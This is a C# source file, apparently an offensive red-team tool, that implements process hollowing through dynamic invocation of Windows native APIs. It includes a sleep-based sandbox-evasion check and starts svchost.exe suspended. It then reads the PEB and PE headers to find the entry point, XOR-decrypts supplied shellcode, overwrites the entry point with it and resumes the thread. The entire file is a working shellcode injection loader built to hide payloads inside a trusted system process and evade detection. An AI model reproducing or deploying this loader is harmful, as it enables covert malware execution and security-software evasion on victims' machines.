using System;
using System.Runtime.InteropServices;
using DInvoke.DynamicInvoke;

namespace Hollow
{
    public class DynamicInvoke
    {
        public static void Hollow(byte[] shellcode, string k) { 
            //Sleep to avoid sandbox environments
            DateTime t1 = DateTime.Now;
            var sleepParameters = new object[]
            {
                    (uint)2000
            };

            Generic.DynamicAPIInvoke("kernel32.dll", "Sleep", typeof(Win32.Sleep), ref sleepParameters);

            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2< 1.69)
            {
                Console.WriteLine("Exiting as sleep wasn't met...");
                return;
            }

                var getCurrentProcParameters = new object[] { };
                var vaexParameters = new object[]
                {
                            Generic.DynamicAPIInvoke("kernel32.dll", "GetCurrentProcess", typeof(Win32.GetCurrentProcess), ref getCurrentProcParameters), IntPtr.Zero, (uint)0x1000, (uint)0x3000, (uint)0x40, (uint)0
                };

                IntPtr veax = (IntPtr)Generic.DynamicAPIInvoke("kernel32.dll", "VirtualAllocExNuma", typeof(Win32.VirtualAllocExNuma), ref vaexParameters);

            if (veax == null)
            {
                return;
            }

            var flsParameters = new object[]
            {
                            IntPtr.Zero
            };

            IntPtr fls = (IntPtr)Generic.DynamicAPIInvoke("kernel32.dll", "FlsAlloc", typeof(Win32.FlsAlloc), ref flsParameters);

            if (fls == null)
            {
                return;
            }

            Win32.PS_CREATE_INFO ci = new Win32.PS_CREATE_INFO();
            // https://gist.github.com/rasta-mouse/2f6316083dd2f38bb91f160cca2088df
            ci.Size = (UIntPtr)88; // sizeof(PS_CREATE_INFO)
            ci.State = Win32.PS_CREATE_STATE.PsCreateInitialState;
            ci.Unused = new byte[76];

            Win32.UNICODE_STRING imagePath, currentDirectory, commandLine;
            imagePath = currentDirectory = commandLine = new Win32.UNICODE_STRING();

            Win32.RtlInitUnicodeString(ref imagePath, "\\??\\C:\\Windows\\System32\\svchost.exe");
            Win32.RtlInitUnicodeString(ref currentDirectory, "C:\\Windows\\System32");
            Win32.RtlInitUnicodeString(ref commandLine, "C:\\Windows\\System32\\svchost.exe");

            var processParams = IntPtr.Zero;

            object[] parameters =
            {
                processParams, imagePath, IntPtr.Zero, currentDirectory, commandLine, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, Win32.CREATE_PROCESS_PARAMETERS_FLAGS.Normalize
            };

            var status = (Win32.NTSTATUS)Generic.DynamicAPIInvoke( "ntdll.dll", "RtlCreateProcessParametersEx", typeof(Win32.RtlCreateProcessParametersEx), ref parameters);

            if (status == Win32.NTSTATUS.Success)
            {
                processParams = (IntPtr)parameters[0];
                Console.WriteLine("[*] Successfully created process parameters with RtlCreateProcessParametersEx");
            }
            else
            {
                Console.WriteLine("[!] Failed to create process parameters!");
            }

            var attributeList = new Win32.PS_ATTRIBUTE_LIST { Attributes = new Win32.PS_ATTRIBUTE[1] };
            attributeList.TotalLength = (UIntPtr)Marshal.SizeOf(attributeList);
            attributeList.Attributes[0].Attribute = 0x20005;
            attributeList.Attributes[0].Size = imagePath.Length;
            attributeList.Attributes[0].Value = imagePath.Buffer;

            IntPtr hThread = IntPtr.Zero;
            IntPtr hProcess = IntPtr.Zero;

            var NtUAddress = Generic.GetLibraryAddress("ntdll.dll", "NtCreateUserProcess");
            var ntCreateUserProcess = (Win32.NtCreateUserProcess)Marshal.GetDelegateForFunctionPointer(NtUAddress, typeof(Win32.NtCreateUserProcess));

            var check = ntCreateUserProcess(ref hProcess, ref hThread, Win32.PROCESS_ACCESS.AllAccess, Win32.THREAD_ACCESS.AllAccess, IntPtr.Zero, IntPtr.Zero, Win32.PROCESS_CREATE_FLAGS.None, Win32.THREAD_CREATE_FLAGS.Suspended, processParams, ref ci, ref attributeList);

            if (check == Win32.NTSTATUS.Success)
            {
                Console.WriteLine("[*] Created svchost.exe process successfully!");
            }
            else
            {
                Console.WriteLine("[!] Failed to create svchost process :(");
            }
            
            Win32.PROCESS_BASIC_INFORMATION bi = new Win32.PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            var address = Generic.GetLibraryAddress("ntdll.dll", "NtQueryInformationProcess");
            var ntQueryInformationProcess = (Win32.NtQueryInformationProcess)Marshal.GetDelegateForFunctionPointer(address, typeof(Win32.NtQueryInformationProcess));

            int res = ntQueryInformationProcess(
                hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp
                );

            if (res == 0)
            {
                Console.WriteLine($"[*] Got process information using NtQueryInformationProcess [PID: {bi.UniquePid}]");
            }
            else
            {
                Console.WriteLine("[!] Failed to get process information using NtQueryInformationProcess :(");
                return;
            }

            // 8 -> Image base address size in x64?
            var addrSize = IntPtr.Size;

            // IntPtr to buf address with addrSize
            // https://learn.microsoft.com/en-us/dotnet/api/system.intptr.topointer?view=net-7.0
            byte[] addrBuf = new byte[addrSize];

            // n * bytes read
            uint nRead = 0;

            // Offset to image base in ntdll.h
            // 16 bytes from the base of the PEB
            // BOOL * 4  (8-bytes) -> HANDLE (8-bytes) -> ImageBase 
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
            
            // Resolve NtReadVirtualMemory address in ntdll
            var rpmAddress = Generic.GetLibraryAddress("ntdll.dll", "NtReadVirtualMemory");
            var NtReadProcessMemory = (Win32.NtReadVirtualMemory)Marshal.GetDelegateForFunctionPointer(rpmAddress, typeof(Win32.NtReadVirtualMemory));

            var r1 = NtReadProcessMemory(
                    hProcess, ptrToImageBase, addrBuf, (uint)addrSize, ref nRead
                );

            if (r1 != Win32.NTSTATUS.Success)
            {
                Console.WriteLine("[!] Failed to NtReadVirtualMemory on the first try :(");
                return;
            }
            
            IntPtr svcHostBase = (IntPtr)BitConverter.ToInt64(addrBuf, 0);
            Console.WriteLine($"[*] Read bytes using NtReadVirtualMemory to obtain base address of svchost.exe [Base: 0x{svcHostBase.ToString("x")}]");
           
            // Allocate the next portion to read from svchost process
            byte[] data = new byte[0x200];

            // Read 200 bytes from the base of svchost.exe and store in the data buffer
            var r2 = NtReadProcessMemory(
                hProcess, svcHostBase, data, (uint)data.Length, ref nRead
                );

            if (r2 != Win32.NTSTATUS.Success)
            {
                Console.WriteLine("[!] Failed to ReadProcessMemory on the second try :(");
                return;
            }

            // e_lfanew is always at base + 0x3C (60)
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);

            // First we have a 4-byte signature 0x4550 (PE)
            // Then the COFF header starts with two bytes to check OS architecture (0x8664 == 64-bit)
            // Then a further 20 bytes including size of optional header, characteristics, etc
            // 24-bytes (0xC) later we're at the Optional Header 
            // Then we need to get to the AddressOfEntryPoint which is at offset 16 inside the Optional Header
            // So 24-bytes + 16-bytes lands us at the AddressOfEntryPoint in the virtual address space of our target process (0x28 == 40dec)
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            Console.WriteLine($"[*] Found relative virtual address of entry point in svchost.exe [RVA: 0x{entrypoint_rva:x})]");

            // Now we get the actual address of entry point by adding the calculated RVA to the base address of our target process
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svcHostBase);
            Console.WriteLine($"[*] Found address of entry point [Entry Point: 0x{addressOfEntryPoint.ToString("x")}]");

            var vpvmAddress = Generic.GetLibraryAddress("ntdll.dll", "NtProtectVirtualMemory");
            var ntProtectVirtualMemory = (Win32.NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(vpvmAddress, typeof(Win32.NtProtectVirtualMemory));
            Win32.MEMORY_PROTECTION oldProtect = (Win32.MEMORY_PROTECTION)0;
            Win32.MEMORY_PROTECTION newProtect = Win32.MEMORY_PROTECTION.PAGE_EXECUTE_WRITECOPY;
            IntPtr size = new IntPtr(entrypoint_rva + shellcode.Length );
            var vpmCheck = ntProtectVirtualMemory(
                hProcess,
                ref svcHostBase,
                ref  size,
                newProtect,
                ref oldProtect
                );

            if (vpmCheck != Win32.NTSTATUS.Success)
            {
                Console.WriteLine($"[!] Failed to modify memory protections for writing. [Returned value: {vpmCheck}]");
                return;
            }
            else
            {
                Console.WriteLine($"[*] Memory protections modified to {newProtect}. [Returned value: {vpmCheck}]");
            }

            // Load NtWriteVirtualMemory into the program from ntdll
            var wpmAddress = Generic.GetLibraryAddress("ntdll.dll", "NtWriteVirtualMemory");
            var ntWriteVirtualMemory = (Win32.NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(wpmAddress, typeof(Win32.NtWriteVirtualMemory));
            uint nbRead = 0;


            // Decryption Routine
            for (int i = 0; i < shellcode.Length; i++)
            {
                shellcode[i] = (byte)(shellcode[i] ^ k[i % k.Length]);
            };

            // https://stackoverflow.com/questions/537573/how-to-get-intptr-from-byte-in-c-sharp
            IntPtr unmanagedPointer = Marshal.AllocHGlobal(shellcode.Length);
            Marshal.Copy(shellcode, 0, unmanagedPointer, shellcode.Length);


            // Write shellcode into the process execution instructions
            var writeCheck = ntWriteVirtualMemory(
                // Handle to svchost
                hProcess, 
                // Address of entry point into svchost
                addressOfEntryPoint,
                // Our shellcode, length, and (n) bytes written 
                unmanagedPointer, 
                (uint)shellcode.Length, 
                ref nbRead
            );

            if (writeCheck != Win32.NTSTATUS.Success)
            {
                Console.WriteLine($"[!] Failed writing memory with NtWriteVirtualMemory. [Returned value: {writeCheck}]");
                return;
            }
            else
            {
                Console.WriteLine($"[*] Successfully wrote to {shellcode.Length} bytes to 0x{addressOfEntryPoint.ToString("x")} with NtWriteVirtualMemory. [Returned value: {writeCheck}]");
            }

            //Since the thread is suspended, we resume rather than execute it
            var resThreadParameters = new object[]
            {
                hThread,
                (uint)0
            };

            // Resume the thread, print corresponding return code to check for issues
            Win32.NTSTATUS resumeCheck = (Win32.NTSTATUS)Generic.DynamicAPIInvoke("ntdll.dll", "NtResumeThread", typeof(Win32.NtResumeThread), ref resThreadParameters);
            if (resumeCheck != Win32.NTSTATUS.Success)
            {
                Console.WriteLine($"[!] Failed to resume the thread! It is still suspended. [Returned value: {resumeCheck}]");
                return;
            }
            else
            {
                Console.WriteLine($"[*] Resumed thread successfully. [Returned value: {resumeCheck}]");
                Marshal.FreeHGlobal(unmanagedPointer);
            }         
        }
    }
}

